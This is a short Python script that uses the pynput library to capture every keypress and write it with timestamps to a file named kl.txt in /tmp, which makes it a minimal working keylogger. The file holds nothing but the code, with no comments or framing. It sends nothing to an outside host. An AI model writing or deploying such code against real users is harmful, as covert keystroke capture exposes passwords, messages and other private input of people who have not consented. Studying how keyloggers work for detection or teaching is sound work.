#!/usr/bin/python3

from pynput.keyboard import Key, Listener
import logging

log_dir = '/tmp/'

logging.basicConfig(filename=(log_dir + "kl.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
